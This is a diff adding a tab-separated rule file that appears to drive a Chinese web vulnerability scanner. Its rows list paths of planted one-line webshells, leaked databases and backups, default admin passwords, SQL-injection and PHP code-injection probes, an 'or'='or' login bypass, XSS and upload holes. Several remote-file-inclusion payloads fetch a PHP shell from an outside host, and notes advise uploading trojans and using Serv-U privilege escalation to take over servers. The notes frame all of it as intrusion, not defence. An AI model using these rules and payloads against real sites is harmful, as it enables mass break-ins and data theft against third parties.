@@ -1,0 +1,212 @@
+CODE	FILENAME	PATH	NOTE
+execute	yesitis.asp	/images/	快捷留言簿 蓝屏一句话木马 
+eval	yesitis.asp	/images/	快捷留言簿  海洋一句话木马 
+execute	shop.asp 	/bbs/data/	超市插件数据库地址 蓝屏一句话木马 
+eval	shop.asp 	/bbs/data/	超市插件数据库地址 海洋一句话木马 
+/alexa/fadmy.asa	fadmy.asa  	/alexa/	alexa作弊的飞速提高 一句话木马 
+# -FrontPage-	authors.pwd  	/_vti_pvt/	Frontpage authors.pwd available 
+密码_	新建 文本文档.txt  	/	_pass 配置信息。
+admin.asp</loc>	sitemap.xml  	/	"网站地图,有管理入口,数据库路径等敏感信息 "
+	password.txt  	/	密码信息。 
+	pass.txt  	/	密码信息。 
+	mima.txt  	/	虚拟主机相关密码信息(管理员习惯)。 
+密码_	ftp.txt  	/	_pass 虚拟主机ftp登录信息。
+探针	aspcheck.asp  	/	asp探针 
+探针	asp.asp  	/	asp探针 
+空间运行环境检测工具	aaa.asp  	/	空间运行环境检测工具 
+密码_	123.txt  	/	_pass 虚拟主机密码信息。
+^<\?php.*?\?>/g	*  	/	php源码泄漏。 
+<title>phpinfo()</title>	*  	/	phpinfo(文件名为*表示验证文件路径) 
+^#!/.*?/perl/g	*  	/	perl源码泄漏。 
+^<%.*?%>/g	*  	/	asp/jsp源码泄漏。 
+application/zip_	wwwroot.zip  	/	_application/x-zip-compressed 网站打包。
+rar!	wwwroot.rar  	/	特征字串也可以用application/octet-stream_ _application/x-rar-compressed
+application/zip_	www.zip  	/	_application/x-zip-compressed 网站打包。(少)
+rar!	www.rar  	/	特征字串也可以为空(速度快准确率低) 
+application/zip_	web.zip  	/	_application/x-zip-compressed 网站打包。(少)
+rar!	web.rar  	/	网站打包。 
+application/x-msaccess	tomdb.mdb  	/	被海阳打包的整站 释放需要同样的工具 
+application/x-msaccess	packet.mdb  	/	被ASPAdmin打包的整站  释放需要同样的工具 
+application/x-msaccess	HYTop.mdb  	/	被海阳打包的整站 释放需要同样的工具 
+application/x-msaccess	HSH.mdb  	/	被海阳打包的整站 释放需要同样的工具 
+<title>选择图片</title>	SelectPic.asp  	/users/Editer/	Editer图片编辑器 
+password	User_Login.asp  	/user/	 
+~Insert Into	dede_admin.txt  	/php/bak/	获得dedecms管理员的md5口令，后台：/admin/index.php 
+password	admin_login.asp  	/eWebEditor/	默认登录用户:admin 默认登录密码:admin  
+Index of /database		/database/	搜索普世购物系统，后台管理员的默认帐号和密码是：admin1 admin1，用动感商城上传工具上传马。  
+password	login.asp  	/	管理后台登陆入口  
+password	login.asp  	/manage/	管理后台登陆入口  
+password	login.asp  	/admin/	管理后台登陆入口  
+Dvbbs-Key	key.asp  	/	管理员钥匙工具  
+Dvbbs-Key	key.asp  	/bbs/	管理员钥匙工具  
+上传		/	搜索普世购物系统，后台管理员的默认帐号和密码是：admin1 admin1，用动感商城上传工具上传马。  
+/</title>	  	/	iis目录列表开启。(文件名为空表示验证目录路径)  
+<title>Index of /		/	apache目录列表开启。  
+<body><h1>Directory Listing For		/	Tomcat目录列表开启。  
+	MMHTTPDB.asp  	/_mmServerScripts/	  
+	MMHTTPDB.php  	/_mmServerScripts/	  
+	MMHTTPDB.asp  	/_mmDBScripts/	  
+	MMHTTPDB.php  	/_mmDBScripts/	  
+<%	conn.asp  	/	暴库  
+<%	conn.asp  	/inc/	暴库  
+	flash/downfile.asp?url=uploadfile/../../conn.asp   	/	新云2.1数据库配置文件下载漏洞  
+	flash/downfile.asp?url=jackie/../../conn.asp   	/	数据库配置文件下载漏洞  
+<%	conn.asp.bak   	/	暴库  
+	movie.mdb   	/shujuku/	  
+application/x-msaccess		/shopxp_data/	shopxp购物系统 默认后台： admin 默认密码：admin-admin  
+application/x-msaccess	ewebeditor1013.mdb   	/new/admin/edit/db/	热血江湖网站.后台：new/admin/edit/Admin_Login.asp  
+	ewebeditor.mdb   	/eWebEditor/db/	  
+	ewebeditor.mdb   	/admin/htmledit/db/	  
+	ewebeditor.mdb   	/admin/editor/db/	  
+application/x-msaccess	venshop.mdb   	/database/	凡人网络购物系统V8.0 默认后台：ad_manage.asp 默认密码：admin-admin  
+	useryyewuhjdjhgutwehdskjwewyt.mdb   	/database/	动力默认数据库  
+application/x-msaccess	snowboy.mdb   	/database/	雪孩论坛 后台:\Admin 默认管理员和密码：snowboy-snowboy  
+application/x-msaccess		/database/	嘉缘人才管理系统默认数据库  
+	companydatabase.mdb   	/database/	默认后台:/manageweb 默认帐号：9qu 密码 ：9quserver   
+application/x-msaccess	21asp.mdb   	/database/	飞越公司企业网站管理系统 后台：\admin 默认密码：admin-admin   
+application/x-msaccess	#newasp.mdb   	/database/	新云网站管理系统   
+application/x-msaccess	#ncms.mdb   	/database/	Ncms默认数据库   
+application/x-msaccess		/data/buk/	二手网。管理后台/admin 登陆信息在扫到的数据库中找。   
+application/x-msaccess	team.mdb   	/data/	Team5 Studio   
+application/x-msaccess	scadata.mdb   	/data/	"商贸通数据库,默认管理后台:admin/index.asp,默认管理员/密码:admin/admin888,建议关键词:Powered By ：SMT   "
+application/x-msaccess		/data/	心动音乐默认数据库路径   
+application/x-msaccess		/data/	常用默认数据库路径   
+application/x-msaccess	Joekoe_CMS_4.0.mdb   	/data/	Joekoe CMS 4.0 默认数据库路径   
+application/x-msaccess	cnhww.mdb   	/cnhwwdata/	网趣默认数据库.后台：/admin 默认密码：admin-admin   
+application/x-msaccess	bbsxp.mdb   	/bbs/database/	bbsxp默认数据库路径   
+application/x-msaccess	bbsxp.mdb   	/database/	bbsxp默认数据库路径   
+application/x-msaccess	BBSXP2007.mdb   	/bbs/database/	bbsxp2007默认数据库路径   
+application/x-msaccess	BBSXP2007.mdb   	/database/	bbsxp2007默认数据库路径   
+application/x-msaccess		/admin/Databackup/	新云   
+application/x-msaccess	KesionCMS4.mdb   	/KS_Data/	科汛CMS默认数据库路径   
+application/x-msaccess		/Foosun_Data/	风讯FoosunCMSv4.0   
+application/x-msaccess	FooSun_Data.mdb   	/FooSun_Data/	风讯网站管理系统   
+application/x-msaccess	myszw.mdb   	/Databases/	后台：admin/login.asp   
+application/x-msaccess	MeskyDMS_Data.mdb   	/Data/	动感下载系统(MeskyDMS)   
+application/x-msaccess	LeadBBS.mdb   	/Data/	   
+	data.asp   	/mhxy/	常用默认数据库路径   
+rar!	sql.rar   	/	sql数据库备份。   
+application/x-msaccess	/db/com02.mdb   	/	企业网站模板   
+application/x-msaccess	dvbbs8.mdb   	/bbs/data/	dvbbs8默认数据库路径   
+application/x-msaccess	dvbbs7.mdb   	/bbs/data/	dvbbs7默认数据库路径   
+application/x-msaccess	dvbbs6.mdb   	/bbs/data/	dvbbs6默认数据库路径   
+	dvboke.asp   	/bbs/boke/data/	动网博客漏洞   
+application/x-msaccess	dvbbs8.mdb   	/data/	dvbbs8默认数据库路径   
+application/x-msaccess	dvbbs7.mdb   	/data/	dvbbs7默认数据库路径   
+application/x-msaccess	dvbbs6.mdb   	/data/	dvbbs6默认数据库路径   
+	dvboke.asp   	/boke/data/	动网博客漏洞   
+application/x-msaccess	dvbbs7_Backup.mdb   	/bbs/Databackup/	dvbbs7默认数据库备份路径   
+	plus_marry_db.asp   	/bbs/DV_plus/marry/	结婚插件   
+跳过备份	update.asp   	/	选择备份数据库可获得数据库路径   
+跳过备份	update.asp   	/bbs/	选择备份数据库可获得数据库路径   
+商店招牌	z_shop_newshop.asp   	/	超市插件 一句话木马插入地址   
+application/x-msaccess	PowerEasy5.mdb #$D#$A   	/database/	   
+application/x-msaccess	PowerEasy2006.mdb   	/database/	   
+php version	"POST /templates/default/wap.lang.php HTTP/1.1#$D#$AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*#$D#$AReferer: http://www1.niutan.com/templates/default/wap.lang.php#$D#$AAccept-Language: zh-cn#$D#$AContent-Type: multipart/form-data; boundary=---------------------------7d71573420904#$D#$AUA-CPU: x86#$D#$AAccept-Encoding: gzip, deflate#$D#$AUser-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)#$D#$AHost: www1.niutan.com#$D#$AContent-Length: 387#$D#$AConnection: Keep-Alive#$D#$ACache-Control: no-cache#$D#$ACookie: phpbb_zhero_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bi%3A-1%3B%7D#$D#$A#$D#$A-----------------------------7d71573420904#$D#$AContent-Disposition: form-data; name=""act""#$D#$A#$D#$Ahttp://www1.niutan.com/templates/default/wap.lang.php#$D#$A-----------------------------7d71573420904#$D#$AContent-Disposition: form-data; name=""para""#$D#$A#$D#$Acmd#$D#$A-----------------------------7d71573420904#$D#$AContent-Disposition: form-data; name=""cmd""#$D#$A#$D#$Aphpinfo();#$D#$A-----------------------------7d71573420904   "	/	扫描被植入eval($_POST[cmd]);的php页面。   
+继续添加新	"POST /Publish.asp HTTP/1.1#$D#$AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*#$D#$AReferer: http://www.ttrj.net/Publish.asp#$D#$AAccept-Language: zh-cn#$D#$AContent-Type: application/x-www-form-urlencoded#$D#$AUA-CPU: x86#$D#$AAccept-Encoding: gzip, deflate#$D#$AUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)#$D#$AHost: www.ttrj.net#$D#$AContent-Length: 541#$D#$APragma: no-cache#$D#$ACache-Control: no-cache#$D#$ACookie: is_use_cookie=yes; is_get_26295=yes; ASPSESSIONIDACTADQQC=MNDIJBBALEHHNIFEDPHDHNMB; is_get_110476=yes; is_get_32488=yes#$D#$A#$D#$Aaction=add&ResName=%7Bname%7D&ResVer=%7Bver%7D&FontColor=&FontType=0&strCatalog=1%2C3%2C1%2C%E4%AF%C0%C0%B8%A8%D6%FA++&ResSize=567&SizeUnit=KB&Keys=&System=Win9X&System=ME&System=NT&System=XP&System=2000&System=2003&ResRank=3&ResLicence=%C3%E2%B7%D1%C8%ED%BC%FE&ResType=%B9%FA%B2%FA%C8%ED%BC%FE&ResLanguage=%BC%F2%CC%E5%D6%D0%CE%C4&UserPoints=0&UserClass=0&authorURL=%7Bhome%7D&authorEmail=%7Bemail%7D&RegURL=&PreviewImg=%7Bsnap%7D&SmallImg=%7Bsnap%7D&content=&content1=%7Bcontent%7D&no=1&Name=%B9%D9%B7%BD%CF%C2%D4%D8&siteID=0&Url=%7Burl%7D   "	/	扫描共享软件发布地址。资源介绍类   
+继续添加新软件	"POST /Publish.asp HTTP/1.1#$D#$AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*#$D#$AReferer: http://www.code999.com/Publish.asp#$D#$AAccept-Language: zh-cn#$D#$AContent-Type: application/x-www-form-urlencoded#$D#$AUA-CPU: x86#$D#$AAccept-Encoding: gzip, deflate#$D#$AUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)#$D#$AHost: www.code999.com#$D#$AContent-Length: 854#$D#$AConnection: Keep-Alive#$D#$ACache-Control: no-cache#$D#$ACookie: ASPSESSIONIDCABQQQCQ=FJNFLKJBGHBBBLLLGAAFKDMN; %3C%25execute+request%28%22value%22%29%25%3E=feiyue=1&feiyueip=2006%2D8%2D21+14%3A55%3A16#$D#$A#$D#$Aaction=add&SoftName=%7Bname%7D&SoftVer=%7Bver%7D&catalogid=1%2C33%2C%CD%F8%C2%E7%B8%A8%D6%FA&SoftSize=567&SizeUnit=KB&System=Win2003&System=WinXP&System=Win2000&System=NT&System=WinME&System=Win9X&Rank=3&LicenceType=%B9%B2%CF%ED%C8%ED%BC%FE&SoftType=%B9%FA%B2%FA%C8%ED%BC%FE&Language=%BC%F2%CC%E5%D6%D0%CE%C4&SoftFrom=%7Bhome%7D&Email=%7Bemail%7D&RegURL=http%3A%2F%2Fwww.softreg.com.cn&SoftViewImg=%7Bsnap%7D&images=&font=%CB%CE%CC%E5&size=3&color=%236495ED&content=%7Bcontent%7D&Address1=%7Burl%7D&Address2=%7Burl2%7D&Address3=%7Burl3%7D&Submit=%CC%E1+%BD%BB   "	/	扫描共享软件发布地址。软件简介类   
+Microsoft OLE DB Provider for ODBC Drivers_	\'   	/	_Microsoft OLE DB Provider for SQL Server_ _ODBC Microsoft Access Driver_
+Microsoft OLE DB Provider for ODBC Drivers_	"\""   "	/	_Microsoft OLE DB Provider for SQL Server_ _ODBC Microsoft Access Driver_
+转换为数据类型	/NewComment.asp?num=1&ChannelID=1&ClassID=1&ModuleName=Article+A+on+C.InfoID=A.ArticleID+where+A.ChannelID=1%20and%20user>0--   	/	动易2006 SP4 SQL版注入漏洞 更有效。   
+Microsoft OLE DB Provider for ODBC Drivers_	"'""   "	/	_Microsoft OLE DB Provider for SQL Server_ _ODBC Microsoft Access Driver_
+Microsoft OLE DB Provider for ODBC Drivers_	'   	/	_Microsoft OLE DB Provider for SQL Server_ _ODBC Microsoft Access Driver_
+Microsoft OLE DB Provider for ODBC Drivers_	%00'   	/	_Microsoft OLE DB Provider for SQL Server_ _ODBC Microsoft Access Driver_
+Microsoft OLE DB Provider for ODBC Drivers_	"""   "	/	_Microsoft OLE DB Provider for SQL Server_ _ODBC Microsoft Access Driver_
+f6efe297f5c4f24521263601b2bab937	printf(md5(vvind.com))%3Bexit%3B//   	/	php code injection.   
+f6efe297f5c4f24521263601b2bab937	'%3Bprintf(md5(vvind.com))%3Bexit%3B//   	/	php code injection.   
+f6efe297f5c4f24521263601b2bab937	%3C%3Fphp%20printf%28md5%28vvind.com%29%29%3B%20%3F%3E   	/	php code injection.   
+f6efe297f5c4f24521263601b2bab937	"""%3Bprintf(md5(vvind.com))%3Bexit%3B//   "	/	php code injection.   
+<script>JavaScript:alert(document.cookie);</script>	showerr.asp?BoardID=0&ErrCodes=54&action=<script>JavaScript:alert(document.cookie);</script>   	/	dvbbs7.1 sp2 跨站漏洞。   
+Illegal request	passport_client.php?passport_ifopen=1&passport_type=client   	/	PHPWind 5.01 - 5.3 UPDATE参数远程SQL注入漏洞的判断 (注入工具:http://www.neeao.com/blog/attachments/200704/06_145904_pw5expgui.zip)   
+	config.inc.php   	/	   
+绝对路径(包括文件名:如	diy.asp   	/	有上传权限的webshell(无口令)   
+绝对路径(包括文件名:如	diy.asp   	/bbs/	有上传权限的webshell(无口令)   
+绝对路径	myup.asp   	/	上传webshell。   
+管理登录	ASPAdmin_A.asp   	/	ASPAdmin工具 默认密码为hididi.net   
+管理登录	ASPAdmin.asp   	/	ASPAdmin工具 默认密码为hididi.net   
+Serv-U	servu.aspx   	/	"serv-U提权aspx版,获得3389肉鸡的捷径   "
+Serv-U	servu.aspx   	/bbs/	"serv-U提权aspx版,获得3389肉鸡的捷径   "
+1906 更新文件	update_baidu.asp   	/count/update/	"COCOON Counter统计程序漏洞 <%eval request(""#"")%>    "
+新会员注册	User_Reg1.asp   	/Reg/	动易2006 注册asp用户漏洞。    
+>> 服务条款和声明</title>	User_Reg.asp   	/Reg/	动易2006 注册asp用户漏洞。    
+Serv-U	servu.php   	/	"serv-U提权php版,获得3389肉鸡的捷径    "
+Serv-U	servu.aspx   	/	"serv-U提权aspx版,获得3389肉鸡的捷径    "
+Serv-U	servu.asp   	/	"serv-U提权asp版,获得3389肉鸡的捷径    "
+Serv-U	servu.php   	/bbs/	"serv-U提权php版,获得3389肉鸡的捷径    "
+Serv-U	servu.aspx   	/bbs/	"serv-U提权aspx版,获得3389肉鸡的捷径    "
+Serv-U	servu.asp   	/bbs/	"serv-U提权asp版,获得3389肉鸡的捷径    "
+设置站长帐号	zz.asp   	/	惊云下载系统管理员添加文件。    
+4.1.0	wish.php   	/	discuz 4.1.0 许愿池插件远程包含漏洞。    
+sa;Password=	web.config   	/	sql server的sa用户连接信息。    
+上传成功	up_BookPicPro.asp   	/	搜索普世购物系统，后台管理员的默认帐号和密码是：admin1 admin1，漏洞文件是up_BookPicPro.asp，用动感商城上传    
+serv-U	su.asp   	/	"serv-U提权asp版,获得3389肉鸡的捷径。    "
+Serv-U	servusu.asp   	/	"serv-U提权asp版,获得3389肉鸡的捷径。    "
+<!----检查用户名，电子邮箱开始-->	register/userreg_step2.asp   	/	最新科汛网站管理系统漏洞。    
+Illegal request	passport_client.php   	/	PHPWind 5.* UPDATE参数远程SQL注入漏洞。    
+"<td height=""30"" align=""right"">管理密码：</td>"	manage/login.asp   	/	用户名和口令均为'or'='or'    
+国家/地区	Region.asp   	/	动易最新0day:Region.asp注入漏洞。    
+document.write	NewComment.asp   	/	动易2006 SP4 SQL版注入漏洞    
+password	myup.asp   	/	asp网站助手的默认上传文件名。    
+password	css.asp   	/	黑客常用文件名系列。    
+cmd.exe	cmd.asp   	/	执行dos命令的webshell    
+password	myup.asp   	/bbs/	asp网站助手的默认上传文件名。    
+password	css.asp   	/bbs/	黑客常用文件名系列。    
+cmd.exe	cmd.asp   	/bbs/	执行dos命令的webshell    
+绝对路径	xiao.asp   	/	    
+password	shell.asp   	/	黑客常用文件名系列。    
+password	log.asp   	/	需要密码的webshell。    
+友情	link_add.asp   	/link/	申请友情连接页面。    
+友情	addlink.asp   	/link/	申请友情连接页面。    
+	CollectDB.mdb   	/Admin/Collect/	云网互动影视采集规则    
+Acunetix	web_scanner_test_file.txt   	/	可写目录。    
+安装向导_	setup.asp   	/	_第一步 设置
+软件简介：	publish.asp   	/	    
+数据非法，操作中止！	dv_dpo.asp   	/	"没有验证DvApi_Enable是否等于True,默认DvApi_SysKey是API_TEST,可以伪造数据    "
+ZwelL	alert.txt   	/	IIS漏洞:根目录写入权限    
+Application Trace	Trace.axd   	/	ASP.NET application trace enabled    
+Password	ScanWebshell.asp   	/	"lake2的ASP木马查找软件,默认密码eviloctal    "
+	DerivedItem.Mdb   	/	小说采集规则    
+rar!	111.rar   	/	    
+rar!	1.rar   	/	    
+	/temp/PE_TemplateProject.mdb   	/	动易模板。    
+规则测试器	/dede/ruletest.php   	/	dede正则规则测试器    
+选择图片	SelectPic.asp   	/users/Editer/	风讯系统漏洞 - 可以浏览整站文件    
+化境	upfile.asp   	/mtv/	化境上传漏洞。    
+先选择	upfile.asp   	/	论坛上传漏洞    
+"type=""file"""	upfile.asp   	/	论坛上传漏洞    
+化境	upfile.asp   	/vod/	化境上传漏洞。    
+化境	upfile.asp   	/music/	化境上传漏洞。    
+先选择	upfile.asp   	/bbs/	论坛上传漏洞    
+"type=""file"""	upfile.asp   	/bbs/	论坛上传漏洞    
+"type=""file"""	uploadPic.asp   	/admin/	    
+"type=""file"""	upload_flash.asp   	/	上传漏洞    
+"type=""file"""	upload_Dialog.asp   	/	上传漏洞    
+"type=""file"""	upload.asp   	/	上传漏洞    
+"type=""file"""	upfile_soft.asp   	/	上传漏洞    
+"type=""file"""	upfile_photo.asp   	/	上传漏洞    
+"type=""file"""	upfile_flash.asp   	/	上传漏洞    
+"type=""file"""	upfile_article.asp   	/	上传漏洞    
+"type=""file"""	upfile_adpic.asp   	/	上传漏洞    
+"type=""file"""	upfile.htm   	/	    
+application/x-msaccess	msmir.mdb   	/msmir/	入侵无忧传奇SF    
+application/x-msaccess	ztqdata.mdb   	/	游戏箱子:征途    
+application/x-msaccess	ztqdata.mdb   	/zt/	游戏箱子:征途    
+rar!	wolserver.rar   	/	传奇世界服务器。    
+application/x-msaccess	msmir_net.mdb   	/	入侵无忧传奇SF    
+rar!	mirserver.rar   	/	传奇私服。    
+application/x-msaccess	MirCMS_ADB.mdb   	/	MirCMS私服整站程序入侵 inurl:MirCMS_News    
+array('	showpic.php?ZGF0YS9zcWxfY29uZmlnLnBocA==   	/	PhpWind查看文件内容。 这里的ZGF0YS9zcWxfY29uZmlnLnBocA== 是路径data/sql_config.php的BASE64编码。    
+saphpshell	shop/npsout_reply.php?INC_SYSHOMEDIR=http://ma.vvind.com/uploads/php.txt?   	/	SHOPEX最新远程包含漏洞利用    
+saphpshell	includes/config.inc.php?racineTBS=http://ma.vvind.com/uploads/php.txt?   	/	国外NSGalPHP漏洞，必须指定挖掘鸡扫描语言才有更多结果。    
+saphpshell	e/class/checklevel.php?check_path=http://ma.vvind.com/uploads/php.txt?   	/	Empire CMS 3.7 Checklevel.PHP远程文件包含漏洞 
+powered by WEBBOY	/	upfile.asp 	
+powered by WEBBOY	/db	upfile.asp 	
+Powered By ：SMT Version 5.0	/	upfile.asp	
+Powered By ：SMT Version 5.0	/bbs	upfile.asp	
+Powered By ：SMT Version 5.0	/	upfile_flash.asp	
+Powered By ：SMT Version 5.0	/bbs	upfile_flash.asp		
+同城约会 贺卡传情 情感随笔 热门投票	/admin	upload_file.asp	明小子上传
+公司后台	/manage	Login.asp	用"or"="or"
+公司后台	/	Login.asp	用"or"="or"
+企业邮局 企业荣誉 营销网络 产品分类 信息反馈 联系我们 收藏本站 网站管理 	/admin	login.asp	后台管理地址,管理员帐号密码=admin	
+Foosun	Admin/	login.asp	后台的后缀全是admin/login.asp
